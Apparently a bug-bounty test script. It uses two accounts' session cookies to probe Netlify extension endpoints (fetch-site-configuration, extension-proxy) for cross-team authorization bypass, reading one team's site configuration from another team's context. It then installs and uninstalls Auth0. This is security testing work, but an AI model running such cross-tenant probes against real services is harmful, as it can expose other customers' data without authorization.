# -*- coding: utf-8 -*-
"""安装 auth0 到 A team -> 测 fetch-site-configuration/extension-proxy -> uninstall
全程 A 自己的 team,可逆。目的:创造真实配置验证 siteId 越权读"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, COOKIE_B, SITE_A

TEAM_A = '6a979dd2ae93f47d55b62897'
TEAM_B = '6a97b6454fef0db964f75db6'
SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
ctx = ssl.create_default_context()


def fn(method, path, body=None, cookie=COOKIE_A, rawlen=800):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=30)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json'}
    if cookie:
        h['Cookie'] = cookie
    b = json.dumps(body).encode() if body is not None else None
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:rawlen].decode('utf-8', 'ignore')
    conn.close()
    return st, out


AUTH0 = {
    'name': 'Auth0', 'slug': 'auth0', 'hostSiteId': '605c8ff1-9532-465f-a8d0-0042475cb5b7',
    'hostSiteUrl': 'https://605c8ff1-9532-465f-a8d0-0042475cb5b7.netlify.app',
}
mdh = {"extension-install-source-meta-data": json.dumps({"source": "h1-test"}),
       "Netlify-Service-Origin": "netlify-react-ui"}

print('== 1. install auth0 -> team A ==')
st, out = fn('POST', '/.netlify/functions/install-extension',
             {'teamId': TEAM_A, 'slug': AUTH0['slug'], 'hostSiteUrl': AUTH0['hostSiteUrl'],
              'metaDataHeaders': mdh})
print('[%d] %s' % (st, out[:400]))
time.sleep(2)

print('\n== 2. fetch-site-configuration(A site + auth0)==')
st, out = fn('GET', '/.netlify/functions/fetch-site-configuration?siteId=%s&teamId=%s&integrationSlug=auth0' % (SITE_A, TEAM_A))
print('[%d] %s' % (st, out[:400]))
st, out = fn('GET', '/.netlify/functions/fetch-site-configuration?siteId=%s&teamId=%s&integrationSlug=auth0' % (SITE_B, TEAM_A))
print('B site + A team [%d] %s' % (st, out[:400]))

print('\n== 3. extension-proxy(A site / B site)==')
st, out = fn('GET', '/.netlify/functions/extension-proxy?teamId=%s&slug=integration-host-site/%s' % (TEAM_A, SITE_A))
print('A site [%d] %s' % (st, out[:400]))
st, out = fn('GET', '/.netlify/functions/extension-proxy?teamId=%s&slug=integration-host-site/%s' % (TEAM_A, SITE_B))
print('B site [%d] %s' % (st, out[:400]))

print('\n== 4. fetch-extension(auth0, A/B team 视角)==')
st, out = fn('GET', '/.netlify/functions/fetch-extension?slug=auth0&teamId=%s' % TEAM_A)
print('A team [%d] %s' % (st, out[:300]))
st, out = fn('GET', '/.netlify/functions/fetch-extension?slug=auth0&teamId=%s' % TEAM_B)
print('B team [%d] %s' % (st, out[:300]))

print('\n== 5. B cookie 交叉读 A 配置 ==')
st, out = fn('GET', '/.netlify/functions/fetch-site-configuration?siteId=%s&teamId=%s&integrationSlug=auth0' % (SITE_A, TEAM_B), cookie=COOKIE_B)
print('B cookie+B team+A site [%d] %s' % (st, out[:300]))

print('\n== 6. uninstall auth0 ==')
st, out = fn('POST', '/.netlify/functions/uninstall-extension',
             {'teamId': TEAM_A, 'slug': AUTH0['slug'], 'hostSiteUrl': AUTH0['hostSiteUrl'], 'v1Migrated': False})
print('[%d] %s' % (st, out[:300]))
